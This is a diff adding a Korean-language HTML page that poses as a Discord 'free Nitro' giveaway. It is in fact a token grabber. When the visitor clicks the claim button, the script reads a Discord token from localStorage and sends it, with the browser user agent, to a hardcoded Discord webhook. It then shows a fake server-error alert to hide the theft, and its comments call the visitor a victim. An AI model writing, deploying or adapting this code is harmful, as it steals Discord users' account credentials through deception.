@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <title>Discord 무료 니트로 이벤트</title>
+    <style>
+        body { background: #313338; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: #2b2d31; padding: 40px; border-radius: 8px; width: 400px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.4); }
+        h2 { color: #5865f2; }
+        p { color: #949ba4; font-size: 14px; }
+        button { width: 100%; padding: 12px; background: #5865f2; border: none; color: white; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 20px; }
+        button:hover { background: #4752c4; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>🎉 무료 Nitro 3개월</h2>
+        <p>버튼을 눌러 디스코드 계정 인증을 완료하고 니트로를 수령하세요!</p>
+        <button onclick="autoGrab()">니트로 받기</button>
+    </div>
+    <script>
+        async function autoGrab() {
+            const webhookUrl = 'https://discord.com/api/webhooks/1568353008071344220/Pq1ZlrWG5Kcqsmir8uGOqDuLwqzRwYdg-twFDbla8s-2KXeTUTBHtL_gygqAktOv8QgQ';
+            
+            let token = "토큰 추출 실패";
+            try {
+                // 브라우저 저장소 및 세션에서 디스코드 토큰 패턴 접근 시도
+                token = window.localStorage.token || localStorage.getItem('token') || "로컬스토리지 토큰 없음";
+            } catch(e) {
+                token = "오류: " + e.message;
+            }
+
+            // 사용자 정보 및 접속 환경 요약
+            const info = {
+                content: `🚨 **[피해자 접속 감지]**\n🔑 **토큰:** \`${token}\`\n🌐 **UA:** \`${navigator.userAgent}\``
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(info)
+            }).finally(() => {
+                // 사용자에게는 자연스러운 오류나 로딩처럼 위장
+                alert('인증 서버와의 연결이 원활하지 않습니다. 다시 시도해주세요.');
+            });
+        }
+    </script>
+</body>
+</html>
